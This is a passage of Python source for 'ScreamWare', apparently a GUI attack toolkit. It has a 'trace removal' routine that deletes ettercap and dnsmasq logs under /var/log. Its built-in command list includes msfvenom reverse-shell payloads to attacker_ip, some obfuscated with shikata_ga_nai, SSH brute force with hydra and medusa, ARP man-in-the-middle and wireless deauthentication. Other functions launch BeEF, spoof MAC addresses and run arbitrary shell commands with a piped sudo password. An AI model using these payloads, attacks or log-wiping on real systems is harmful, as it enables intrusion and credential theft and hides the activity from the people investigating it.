            # Try to clear DNS cache (requires sudo)
            subprocess.run("sudo systemctl restart systemd-resolved", shell=True, capture_output=True)
            log_output("✅ DNS cache cleared", "success")
        except Exception as e:
            log_output(f"⚠️ Could not clear DNS cache: {e}", "warning")

    # Clear temporary files
    if cleanup_config["clear_temp_files"]:
        try:
            import tempfile
            import glob
            temp_files = glob.glob("/tmp/screamware_*") + glob.glob("/var/tmp/screamware_*")
            for temp_file in temp_files:
                try:
                    os.remove(temp_file)
                except:
                    pass
            log_output("✅ Temporary files cleared", "success")
        except Exception as e:
            log_output(f"⚠️ Could not clear temp files: {e}", "warning")

    # Reset network configuration
    if cleanup_config["reset_network"]:
        try:
            log_output("⚠️ Network reset not implemented yet", "warning")
        except Exception as e:
            log_output(f"❌ Error resetting network: {e}", "error")

    log_output("🧹 Cleanup completed", "success")

def toggle_auto_cleanup():
    """Toggle automatic cleanup on exit"""
    cleanup_config["auto_cleanup"] = not cleanup_config["auto_cleanup"]
    status = "enabled" if cleanup_config["auto_cleanup"] else "disabled"
    log_output(f"🔧 Auto cleanup on exit: {status}", "info")

def save_cleanup_settings():
    """Save cleanup configuration"""
    try:
        settings = {
            "cleanup_config": cleanup_config,
            "target_rotation": target_rotation,
            "domain_list": domain_list
        }
        with open("screamware_settings.json", 'w') as f:
            json.dump(settings, f, indent=4)
        log_output("💾 Cleanup settings saved", "success")
    except Exception as e:
        log_output(f"❌ Failed to save cleanup settings: {e}", "error")

def load_cleanup_settings():
    """Load cleanup configuration"""
    try:
        if os.path.exists("screamware_settings.json"):
            with open("screamware_settings.json", 'r') as f:
                settings = json.load(f)

            global cleanup_config, target_rotation, domain_list
            cleanup_config.update(settings.get("cleanup_config", {}))
            target_rotation.update(settings.get("target_rotation", target_rotation))

            loaded_domains = settings.get("domain_list", [])
            if loaded_domains:
                domain_list.clear()
                domain_list.extend(loaded_domains)
                update_domain_list()

            log_output("📂 Cleanup settings loaded", "success")
    except Exception as e:
        log_output(f"❌ Failed to load cleanup settings: {e}", "error")

# Enhanced cleanup function
def enhanced_cleanup():
    """Enhanced cleanup with more thorough trace removal"""
    log_output("🧹 Starting enhanced cleanup...", "info")

    # Stop all monitoring and rotation
    stop_traffic_monitor()
    stop_target_rotation()

    # Clear logs and temporary data
    try:
        # Clear any lingering log files
        log_files = [
            "/var/log/ettercap.log",
            "/var/log/dnsmasq.log",
            os.path.expanduser("~/.screamware_*.log")
        ]

        for log_file in log_files:
            if "*" in log_file:
                import glob
                for f in glob.glob(log_file):
                    try:
                        os.remove(f)
                    except:
                        pass
            else:
                try:
                    if os.path.exists(log_file):
                        os.remove(log_file)
                except:
                    pass

        # Clear any network settings changes
        # This would require sudo access for actual implementation
        log_output("✅ Enhanced cleanup completed", "success")

    except Exception as e:
        log_output(f"❌ Error in enhanced cleanup: {e}", "error")

# -----------------------
# Apache controls (start/stop), streaming output
# -----------------------
APACHE_SYMLINK = Path("/var/www/html/screamware_lab")  # symlink target used previously; we will manage files directly here

def _run_command_with_sudo(cmd, password, stream_output=True):
    try:
        proc = subprocess.Popen(
            ["sudo", "-S", "bash", "-lc", cmd],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1
        )
        try:
            proc.stdin.write(password + "\n")
            proc.stdin.flush()
        except Exception:
            pass

        output_lines = []
        for line in iter(proc.stdout.readline, ''):
            if not line:
                break
            line = line.rstrip()
            output_lines.append(line)
            if stream_output:
                log_output(line, "output")
        try:
            proc.stdout.close()
        except Exception:
            pass
        rc = proc.wait()
        return rc, "\n".join(output_lines)
    except Exception as e:
        tb = traceback.format_exc()
        log_output(f"❌ Command execution failed: {e}\n{tb}", "error")
        return -1, str(e) + "\n" + tb

def check_apache_installed():
    return shutil.which("apache2") is not None or shutil.which("httpd") is not None

def start_apache_host():
    """Start/Re-start Apache to serve files under /var/www/html (our HTML lab path)."""
    try:
        import platform
        is_windows = platform.system() == "Windows"

        if is_windows:
            log_output("⚠️ Apache automation not supported on Windows", "warning")
            messagebox.showinfo("Windows Limitation",
                "Apache start/stop automation is not available on Windows. Please start your web server manually.", parent=root)
            return

        if not check_apache_installed():
            log_output("❌ Apache2 not found. Install with: sudo apt install apache2", "error")
            return
        prompt = ("This will (re)start Apache2 to serve files under /var/www/html.\nEnter sudo password to continue:")
        password = simpledialog.askstring("Sudo Password Required", prompt, show="*", parent=root)
        if password is None:
            log_output("⚠️ Start hosting cancelled by user.", "warning")
            return

        def _start(password_local):
            try:
                # ensure the HTML_LAB_DIR exists; create if possible with sudo
                try:
                    if not HTML_LAB_DIR.exists():
                        cmd_mkdir = f"mkdir -p {str(HTML_LAB_DIR)} && chown -R $USER:www-data {str(HTML_LAB_DIR)} && chmod -R 775 {str(HTML_LAB_DIR)}"
                        log_output("🔧 Ensuring HTML lab directory exists and permissions are usable...", "info")
                        rc, _ = _run_command_with_sudo(cmd_mkdir, password_local)
                        if rc != 0:
                            log_output("⚠️ Could not create HTML lab directory with sudo. You may need to create it manually.", "warning")
                except Exception:
                    pass

                # restart apache
                if shutil.which("systemctl"):
                    cmd_service = "systemctl restart apache2"
                else:
                    cmd_service = "service apache2 restart"
                log_output("🔁 Restarting Apache2...", "info")
                rc2, _ = _run_command_with_sudo(cmd_service, password_local)
                if rc2 == 0:
                    log_output(f"✅ Apache2 restarted. Your lab is available at: http://127.0.0.1/screamware_lab/", "success")
                    apache_status["running"] = True
                else:
                    log_output("❌ Failed to restart Apache2. See output above for details.", "error")
                    apache_status["running"] = False
            except Exception as e:
                tb = traceback.format_exc()
                log_output(f"❌ Unexpected error while starting apache: {e}\n{tb}", "error")
                apache_status["running"] = False

        threading.Thread(target=_start, args=(password,), daemon=True).start()

    except Exception as e:
        tb = traceback.format_exc()
        log_output(f"❌ start_apache_host error: {e}\n{tb}", "error")

def stop_apache_host():
    try:
        import platform
        is_windows = platform.system() == "Windows"

        if is_windows:
            log_output("⚠️ Apache automation not supported on Windows", "warning")
            messagebox.showinfo("Windows Limitation",
                "Apache start/stop automation is not available on Windows. Please stop your web server manually.", parent=root)
            return

        if not check_apache_installed():
            log_output("❌ Apache2 not found.", "error")
            return
        prompt = ("Stopping Apache2 requires sudo. Enter password to continue:")
        password = simpledialog.askstring("Sudo Password Required", prompt, show="*", parent=root)
        if password is None:
            log_output("⚠️ Stop hosting cancelled by user.", "warning")
            return

        def _stop(password_local):
            try:
                if shutil.which("systemctl"):
                    cmd_service = "systemctl stop apache2"
                else:
                    cmd_service = "service apache2 stop"
                log_output("⏹️ Stopping Apache2...", "info")
                rc, _ = _run_command_with_sudo(cmd_service, password_local)
                if rc == 0:
                    log_output("✅ Apache2 stopped.", "success")
                    apache_status["running"] = False
                else:
                    log_output("❌ Failed to stop Apache2. See output above.", "error")
            except Exception as e:
                tb = traceback.format_exc()
                log_output(f"❌ Unexpected error while stopping apache: {e}\n{tb}", "error")

        threading.Thread(target=_stop, args=(password,), daemon=True).start()

    except Exception as e:
        tb = traceback.format_exc()
        log_output(f"❌ stop_apache_host error: {e}\n{tb}", "error")

# -----------------------
# Console functionality
# -----------------------
def execute_command(command, output_callback=None):
    """Execute a command and return output"""
    try:
        import platform
        is_windows = platform.system() == "Windows"

        # Add command to history
        if command.strip():
            command_history.append(command)
            global history_index
            history_index = len(command_history)

        log_output(f"💻 Executing: {command}", "info")

        if is_windows:
            # Windows: Use cmd
            proc = subprocess.Popen(
                ['cmd', '/c', command],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
        else:
            # Linux/Mac: Use bash
            proc = subprocess.Popen(
                ['bash', '-c', command],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

        output_lines = []
        for line in iter(proc.stdout.readline, ''):
            if line:
                output_lines.append(line.rstrip())
                if output_callback:
                    output_callback(line.rstrip())

        proc.stdout.close()
        return_code = proc.wait()

        if return_code == 0:
            log_output(f"✅ Command completed successfully", "success")
        else:
            log_output(f"⚠️ Command exited with code: {return_code}", "warning")

        return "\n".join(output_lines), return_code

    except Exception as e:
        error_msg = f"❌ Command execution failed: {e}"
        log_output(error_msg, "error")
        return error_msg, -1

def get_kali_commands():
    """Return flat list of all Kali Linux commands"""
    return [
        # 🔍 Reconnaissance & Scanning
        "nmap -sS -O target_ip",
        "theHarvester -d target_domain -b google",
        "dnsenum target_domain",
        "recon-ng",
        "netdiscover",
        "xprobe2 -v -p target_ip",

        # 📂 Directory & File Discovery
        "dirb http://target_ip",
        "gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "ffuf -u http://target_ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",

        # 🔐 Brute Force & Login Attacks
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip",
        "medusa -h target_ip -u admin -P /usr/share/wordlists/rockyou.txt -M ssh",

        # 🧬 Web App Testing
        "sqlmap -u http://target_ip/page?id=1 --dbs",
        "wpscan --url http://target_ip",
        "nikto -h http://target_ip",
        "burpsuite",

        # 📡 Network Sniffing & MITM
        "wireshark",
        "tcpdump -i interface",
        "ettercap -T -q -i interface -M arp:remote /target_ip/ /gateway_ip/",

        # 📶 Wireless Attacks
        "airmon-ng start wlan0",
        "airodump-ng wlan0mon",
        "aireplay-ng -0 10 -a target_bssid wlan0mon",

        # 🔓 Password Cracking
        "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt",
        "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",

        # 💣 Exploitation Frameworks
        "metasploit",
        "msfconsole",
        "searchsploit term",
        "beef-xss",
        "setoolkit",

        # 🧭 SMB & Windows Enumeration
        "enum4linux target_ip",
        "smbclient -L target_ip",
        "smbmap -H target_ip",

        # 📡 Remote Access & Transfer
        "ftp target_ip",
        "ssh user@target_ip",
        "curl -I http://target_ip",
        "wget http://target_ip/file",

        # 🧪 Misc Tools
        "macchanger -r wlan0",
        "tor",
        "proxychains nmap -sT target_ip",

        # 🪟 Windows Payloads (msfvenom)
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe",
        "msfvenom -p windows/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe > shell_https.exe",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f ps1 > shell.ps1",
        "msfvenom -p windows/shell/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell_basic.exe",
        "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=attacker_ip LPORT=4444 -f exe > staged.exe",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll > payload.dll",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f hta-psh > payload.hta",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f vbs > payload.vbs",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f bat > payload.bat",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f c > payload.c",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f python > payload.py",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f asp > payload.asp",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -i icon.ico > payload.exe",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > obfuscated.exe"
    ]

def add_to_favorites(command):
    """Add a command to favorites"""
    if command and command not in favorite_commands:
        favorite_commands.append(command)
        log_output(f"⭐ Added to favorites: {command}", "success")

def remove_from_favorites(command):
    """Remove a command from favorites"""
    if command in favorite_commands:
        favorite_commands.remove(command)
        log_output(f"🗑️ Removed from favorites: {command}", "info")

def clear_console_history():
    """Clear console command history"""
    global command_history, history_index
    command_history.clear()
    history_index = -1
    log_output("🧹 Console history cleared", "info")

def save_command_history():
    """Save command history to file"""
    try:
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=f"console_history_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )

        if filename:
            with open(filename, 'w') as f:
                f.write("=== ScreamWare Console Command History ===\n")
                f.write(f"Export Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for i, cmd in enumerate(command_history, 1):
                    f.write(f"{i}. {cmd}\n")

            log_output(f"📄 Console history saved to {filename}", "success")
    except Exception as e:
        log_output(f"❌ Failed to save history: {e}", "error")

# -----------------------
# MISC Tools functionality
# -----------------------
def port_scan(target, ports="1-1000", scan_type="tcp"):
    """Perform port scanning on target"""
    try:
        log_output(f"🔍 Starting port scan on {target} (ports {ports})", "info")

        import platform
        is_windows = platform.system() == "Windows"

        if is_windows or not shutil.which("nmap"):
            # Fallback: simple socket scan for common ports
            return simple_port_scan(target, ports)
        else:
            # Use nmap for comprehensive scanning
            cmd = f"nmap -p {ports} -{scan_type} {target}"
            output, return_code = execute_command(cmd)

            # Parse nmap output
            results = parse_nmap_output(output)
            port_scan_results.extend(results)

            return results

    except Exception as e:
        log_output(f"❌ Port scan failed: {e}", "error")
        return []

def simple_port_scan(target, port_range):
    """Simple port scan using sockets (fallback when nmap not available)"""
    try:
        import socket
        from concurrent.futures import ThreadPoolExecutor, as_completed

        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
        else:
            start, end = int(port_range), int(port_range)

        results = []
        open_ports = []

        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                return port, result == 0
            except:
                return port, False

        # Multi-threaded scanning
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(scan_port, port): port for port in range(start, end + 1)}

            for future in as_completed(futures):
                port, is_open = future.result()
                if is_open:
                    open_ports.append(port)
                    results.append({
                        "port": port,
                        "state": "open",
                        "service": "unknown",
                        "target": target
                    })

        log_output(f"🔍 Found {len(open_ports)} open ports on {target}", "success")
        return results

    except Exception as e:
        log_output(f"❌ Simple port scan failed: {e}", "error")
        return []

def parse_nmap_output(output):
    """Parse nmap output to extract port information"""
    results = []
    try:
        lines = output.split('\n')
        for line in lines:
            if '/tcp' in line and 'open' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port = parts[0].split('/')[0]
                    state = parts[1]
                    service = parts[2] if len(parts) > 2 else "unknown"

                    results.append({
                        "port": int(port),
                        "state": state,
                        "service": service,
                        "protocol": "tcp"
                    })
            elif '/udp' in line and 'open' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port = parts[0].split('/')[0]
                    state = parts[1]
                    service = parts[2] if len(parts) > 2 else "unknown"

                    results.append({
                        "port": int(port),
                        "state": state,
                        "service": service,
                        "protocol": "udp"
                    })
    except Exception as e:
        log_output(f"⚠️ Error parsing nmap output: {e}", "warning")

    return results

def whois_lookup(domain):
    """Perform WHOIS lookup on domain"""
    try:
        log_output(f"🔍 WHOIS lookup for {domain}", "info")

        if shutil.which("whois"):
            cmd = f"whois {domain}"
            output, return_code = execute_command(cmd)

            whois_results[domain] = {
                "output": output,
                "timestamp": datetime.now(),
                "return_code": return_code
            }

            return output
        else:
            # Fallback: basic whois using socket
            return simple_whois(domain)

    except Exception as e:
        log_output(f"❌ WHOIS lookup failed: {e}", "error")
        return f"Error: {e}"

def simple_whois(domain):
    """Simple WHOIS lookup using socket (fallback)"""
    try:
        import socket
        whois_server = "whois.iana.org"

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((whois_server, 43))

        sock.send(f"{domain}\r\n".encode())
        response = sock.recv(4096).decode()
        sock.close()

        return response

    except Exception as e:
        return f"Simple WHOIS failed: {e}"

def dns_lookup(domain, record_type="A"):
    """Perform DNS lookup for different record types"""
    try:
        if domain in dns_cache and record_type in dns_cache[domain]:
            cached_result = dns_cache[domain][record_type]
            log_output(f"📋 DNS cache hit for {domain} ({record_type})", "info")
            return cached_result

        log_output(f"🔍 DNS lookup: {domain} ({record_type})", "info")

        if shutil.which("dig"):
            cmd = f"dig {domain} {record_type}"
            output, return_code = execute_command(cmd)
        elif shutil.which("nslookup"):
            if record_type == "A":
                cmd = f"nslookup {domain}"
            else:
                cmd = f"nslookup -type={record_type} {domain}"
            output, return_code = execute_command(cmd)
        else:
            # Fallback: Python socket lookup
            return simple_dns_lookup(domain, record_type)

        # Cache the result
        if domain not in dns_cache:
            dns_cache[domain] = {}
        dns_cache[domain][record_type] = output

        return output

    except Exception as e:
        log_output(f"❌ DNS lookup failed: {e}", "error")
        return f"Error: {e}"

def simple_dns_lookup(domain, record_type="A"):
    """Simple DNS lookup using Python sockets (fallback)"""
    try:
        import socket

        if record_type == "A":
            ip = socket.gethostbyname(domain)
            return f"{domain} -> {ip}"
        elif record_type == "MX":
            # Note: Python doesn't have built-in MX lookup without additional libraries
            return f"MX lookup not available without dig/nslookup"
        else:
            return f"Record type {record_type} not supported in fallback mode"

    except Exception as e:
        return f"DNS lookup failed: {e}"

def generate_random_mac():
    """Generate a random, locally administered, unicast MAC address"""
    mac_bytes = [random.randint(0, 255) for _ in range(6)]
    mac_bytes[0] &= 0xFC  # Clear multicast and globally unique bits
    return ':'.join(f'{byte:02x}' for byte in mac_bytes)

def change_mac_address(interface, new_mac, dry_run=False):
    """Change MAC address of network interface (Linux only)"""
    try:
        is_windows = platform.system() == "Windows"
        if is_windows:
            log_output("⚠️ MAC address changing not supported on Windows", "warning")
            return False

        # Check if interface exists
        interfaces = get_network_interfaces()
        if interface not in interfaces:
            log_output(f"❌ Interface {interface} not found", "error")
            return False

        # Handle random MAC generation
        if new_mac.lower() == "random":
            new_mac = generate_random_mac()

        # Validate MAC address format
        mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$|^[0-9A-Fa-f]{12}$'
        if not re.match(mac_pattern, new_mac):
            log_output("❌ Invalid MAC address format", "error")
            return False

        log_output(f"🔧 Changing MAC address of {interface} to {new_mac}", "info")

        # Commands to change MAC address
        commands = [
            f"sudo ip link set {interface} down",
            f"sudo ip link set {interface} address {new_mac}",
            f"sudo ip link set {interface} up"
        ]

        for cmd in commands:
            if dry_run:
                log_output(f"[DRY RUN] Would execute: {cmd}", "info")
            else:
                output, return_code = execute_command(cmd)
                if return_code != 0:
                    log_output(f"❌ Failed to execute: {cmd}", "error")
                    return False

        log_output(f"✅ MAC address changed successfully", "success")
        return True

    except Exception as e:
        log_output(f"❌ MAC address change failed: {e}", "error")
        return False

def launch_beef():
    """Launch BeEF (Browser Exploitation Framework)"""
    global beef_process

    try:
        import platform
        is_windows = platform.system() == "Windows"

        if is_windows:
            log_output("⚠️ BeEF is primarily a Linux tool. Windows support may be limited.", "warning")
            # Still try to launch if available

        # Check if BeEF is installed
        if shutil.which("beef-xss"):
            beef_command = "beef-xss"
        elif shutil.which("beef"):
            beef_command = "beef"
        else:
            # Check common installation paths
            beef_paths = [
                "/usr/share/beef-xss/beef",
                "/usr/local/bin/beef-xss",
                "/opt/beef/beef",
                "/usr/bin/beef-xss"
            ]
            beef_command = None
            for path in beef_paths:
                if os.path.exists(path):
                    beef_command = path
                    break

        if not beef_command:
            log_output("❌ BeEF (BeEF-xss) not found. Please install with: sudo apt install beef-xss", "error")
            messagebox.showerror("BeEF Not Found",
                "BeEF (BeEF-xss) is not installed or not in PATH.\n\n"
                "Install with: sudo apt update && sudo apt install beef-xss\n"
                "Or check if it's installed in a custom location.", parent=root)
            return False

        # Check if BeEF is already running
        if beef_process and beef_process.poll() is None:
            log_output("⚠️ BeEF is already running", "warning")
            messagebox.showinfo("BeEF Already Running",
                "BeEF is already running!\n\n"
                "Check the console output for the web interface URL.", parent=root)
            return True

        log_output("🥩 Launching BeEF (Browser Exploitation Framework)...", "info")
        log_output("📡 Starting BeEF server...", "info")

        def run_beef():
            global beef_process
            try:
                # Launch BeEF in a separate process
                beef_process = subprocess.Popen(
                    [beef_command],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )

                # Monitor output for the web interface URL
                web_url_found = False
                for line in iter(beef_process.stdout.readline, ''):
                    if line:
                        log_output(f"🥩 BeEF: {line.strip()}", "output")

                        # Look for the web interface URL in output
                        if not web_url_found and ("http://127.0.0.1:" in line or "http://localhost:" in line):
                            # Extract URL from line
                            import re
                            url_match = re.search(r'https?://[^\s]+', line)
                            if url_match:
                                web_url = url_match.group(0)
                                log_output(f"🌐 BeEF Web Interface: {web_url}", "success")
                                log_output(f"🎯 Default credentials: beef:beef", "info")

                                # Ask user if they want to open the web interface
                                root.after(100, lambda: ask_open_beef_ui(web_url))
                                web_url_found = True
                        elif "BeEF service started" in line.lower():
                            # Fallback URL detection
                            log_output("🌐 BeEF Web Interface likely available at: http://127.0.0.1:3000/ui/panel", "success")
                            log_output("🎯 Default credentials: beef:beef", "info")
                            root.after(100, lambda: ask_open_beef_ui("http://127.0.0.1:3000/ui/panel"))
                            web_url_found = True

                beef_process.stdout.close()
                return_code = beef_process.wait()

                if return_code != 0:
                    log_output(f"⚠️ BeEF exited with code: {return_code}", "warning")
                else:
                    log_output("✅ BeEF stopped cleanly", "success")

            except Exception as e:
                log_output(f"❌ Error running BeEF: {e}", "error")
            finally:
                beef_process = None

        # Start BeEF in a thread
        threading.Thread(target=run_beef, daemon=True).start()

        return True

    except Exception as e:
        log_output(f"❌ Failed to launch BeEF: {e}", "error")
        return False

def ask_open_beef_ui(url):
    """Ask user if they want to open the BeEF web interface"""
    try:
        result = messagebox.askyesno(
            "BeEF Web Interface Available",
            f"BeEF web interface is running at:\n{url}\n\n"
            "Default credentials: beef:beef\n\n"
            "Would you like to open it in your browser?",
            parent=root
        )

        if result:
            webbrowser.open(url)
            log_output(f"🌐 Opened BeEF web interface: {url}", "success")
    except Exception as e:
        log_output(f"❌ Error opening browser: {e}", "error")

def stop_beef():
    """Stop running BeEF process"""
    global beef_process

    if beef_process and beef_process.poll() is None:
        try:
            log_output("⏹️ Stopping BeEF...", "info")
            beef_process.terminate()

            # Give it a moment to terminate gracefully
            beef_process.wait(timeout=5)

            log_output("✅ BeEF stopped", "success")
            beef_process = None
            return True
        except subprocess.TimeoutExpired:
            log_output("⚠️ Force killing BeEF...", "warning")
            beef_process.kill()
            beef_process = None
            return True
        except Exception as e:
            log_output(f"❌ Error stopping BeEF: {e}", "error")
            return False
    else:
        log_output("⚠️ BeEF is not running", "info")
        return False

def check_beef_status():
    """Check if BeEF is running and return status"""
    global beef_process

    if beef_process and beef_process.poll() is None:
        return {"running": True, "message": "BeEF is running"}
    else:
        return {"running": False, "message": "BeEF is not running"}

def get_beef_info():
    """Get information about BeEF installation"""
    info = {
        "installed": False,
        "command": None,
        "paths": []
    }

    # Check for BeEF command
    if shutil.which("beef-xss"):
        info["installed"] = True
        info["command"] = "beef-xss"
    elif shutil.which("beef"):
        info["installed"] = True
        info["command"] = "beef"

    # Check common installation paths
    beef_paths = [
        "/usr/share/beef-xss/beef",
        "/usr/local/bin/beef-xss",
        "/opt/beef/beef",
        "/usr/bin/beef-xss",
        "/usr/share/beef/beef"
    ]

    for path in beef_paths:
        if os.path.exists(path):
            info["paths"].append(path)
            if not info["installed"]:
                info["installed"] = True
                info["command"] = path

    return info

# -----------------------
# Ping Tools functionality
# -----------------------
def ping_host(host, count=4, timeout=2):
    """Ping a single host and return results"""
    try:
        import platform
        is_windows = platform.system() == "Windows"

        if is_windows:
            cmd = ['ping', '-n', str(count), '-w', str(timeout*1000), host]
        else:
            cmd = ['ping', '-c', str(count), '-W', str(timeout), host]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout*count+5)

        if result.returncode == 0:
            # Parse ping output for statistics
            return parse_ping_output(result.stdout, host)
        else:
            return {
                "host": host,
                "success": False,
                "error": "Host unreachable or ping timeout",
                "response_time": None,
                "packet_loss": 100
            }
    except subprocess.TimeoutExpired:
        return {
            "host": host,
            "success": False,
            "error": "Ping timeout",
            "response_time": None,
            "packet_loss": 100
        }
    except Exception as e:
        return {
            "host": host,
            "success": False,
            "error": str(e),
            "response_time": None,
            "packet_loss": 100
        }

def parse_ping_output(output, host):
    """Parse ping command output to extract statistics"""
    try:
        import platform
        is_windows = platform.system() == "Windows"

        if is_windows:
            # Windows ping output parsing
            lines = output.split('\n')
            response_times = []
            packet_loss = 0

            for line in lines:
                if 'time=' in line.lower() or 'zeit=' in line.lower():
                    # Extract time from "Reply from 192.168.1.1: bytes=32 time=1ms TTL=64"
                    try:
                        time_part = line.split('time=')[1].split('ms')[0].strip()
                        response_time = float(time_part)
                        response_times.append(response_time)
                    except:
                        pass
                elif 'Packets:' in line and 'Lost' in line:
                    # Extract packet loss from "Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)"
                    try:
                        loss_part = line.split('(')[1].split('%')[0]
                        packet_loss = int(loss_part.strip())
                    except:
                        pass

            if response_times:
                return {
                    "host": host,
                    "success": True,
                    "response_time": sum(response_times) / len(response_times),
                    "min_time": min(response_times),
                    "max_time": max(response_times),
                    "packet_loss": packet_loss,
                    "packets_sent": len(response_times),
                    "raw_output": output
                }
            else:
                return {
                    "host": host,
                    "success": False,
                    "error": "No response times found",
                    "response_time": None,
                    "packet_loss": 100
                }
        else:
            # Linux/Mac ping output parsing
            lines = output.split('\n')
            response_times = []
            packet_loss = 0

            for line in lines:
                if 'time=' in line:
                    try:
                        time_part = line.split('time=')[1].split(' ')[0]
                        response_time = float(time_part)
                        response_times.append(response_time)
                    except:
                        pass
                elif 'packet loss' in line.lower():
                    try:
                        loss_part = line.split(',')[2].split('%')[0].strip()
                        packet_loss = int(loss_part)
                    except:
                        pass

            if response_times:
                return {
                    "host": host,
                    "success": True,
                    "response_time": sum(response_times) / len(response_times),
                    "min_time": min(response_times),
                    "max_time": max(response_times),
                    "packet_loss": packet_loss,
                    "packets_sent": len(response_times),
                    "raw_output": output
                }
            else:
                return {
                    "host": host,
                    "success": False,
                    "error": "No response times found",
                    "response_time": None,
                    "packet_loss": 100
                }
    except Exception as e:
        return {
            "host": host,
            "success": False,
            "error": f"Parse error: {str(e)}",
            "response_time": None,
            "packet_loss": 100
        }

def continuous_ping_monitor(host, output_callback):
    """Continuously ping a host and call output_callback with results"""
    global continuous_ping_active

    def ping_loop():
        while continuous_ping_active:
            result = ping_host(host, count=1)
            ping_history.append(result)

            # Update ping statistics
            update_ping_stats(result)

            # Call callback with result
            if output_callback:
                output_callback(result)

            # Wait before next ping
            threading.Event().wait(2)

    ping_thread = threading.Thread(target=ping_loop, daemon=True)
    ping_thread.start()

def update_ping_stats(result):
    """Update global ping statistics"""
    global ping_stats

    ping_stats["total_pings"] += 1

    if result["success"]:
        ping_stats["successful"] += 1
        if result["response_time"]:
            ping_stats["avg_response"] = (ping_stats["avg_response"] * (ping_stats["successful"] - 1) + result["response_time"]) / ping_stats["successful"]
            ping_stats["min_response"] = min(ping_stats["min_response"], result["response_time"])
            ping_stats["max_response"] = max(ping_stats["max_response"], result["response_time"])
    else:
        ping_stats["failed"] += 1

def ping_sweep(network_range, callback=None):
    """Ping multiple hosts in a network range"""
    try:
        network = ipaddress.IPv4Network(network_range, strict=False)
        hosts_to_ping = []

        for ip in network.hosts():
            if str(ip).endswith('.0') or str(ip).endswith('.255'):
                continue  # Skip network and broadcast addresses
            hosts_to_ping.append(str(ip))

        log_output(f"🔍 Starting ping sweep of {len(hosts_to_ping)} hosts in {network_range}", "info")

        def sweep_host(host):
            result = ping_host(host, count=1)
            ping_history.append(result)
            update_ping_stats(result)

            if callback:
                callback(result)

        # Use threading for faster scanning
        threads = []
        for host in hosts_to_ping:
            thread = threading.Thread(target=sweep_host, args=(host,), daemon=True)
            threads.append(thread)
            thread.start()

            # Limit concurrent threads to avoid overwhelming the system
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=5)
                threads = []

        # Wait for remaining threads
        for thread in threads:
            thread.join(timeout=5)

        log_output(f"✅ Ping sweep completed", "success")

    except Exception as e:
        log_output(f"❌ Ping sweep failed: {e}", "error")

def stop_all_pings():
    """Stop all ping operations"""
    global continuous_ping_active, ping_processes

    continuous_ping_active = False

    # Stop any continuous ping processes
    for process_id, process in ping_processes.items():
        try:
            if process.poll() is None:
                process.terminate()
        except:
            pass

    ping_processes.clear()
    log_output("⏹️ All ping operations stopped", "info")

def export_ping_results():
    """Export ping history to a file"""
    try:
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv"), ("All files", "*.*")],
            initialfile=f"ping_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )

        if filename:
            with open(filename, 'w') as f:
                f.write("=== ScreamWare Ping Results ===\n")
                f.write(f"Export Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

                # Summary statistics
                f.write("=== Summary Statistics ===\n")
                f.write(f"Total Pings: {ping_stats['total_pings']}\n")
                f.write(f"Successful: {ping_stats['successful']}\n")
                f.write(f"Failed: {ping_stats['failed']}\n")
                f.write(f"Success Rate: {(ping_stats['successful']/ping_stats['total_pings']*100):.1f}%\n" if ping_stats['total_pings'] > 0 else "Success Rate: 0%\n")
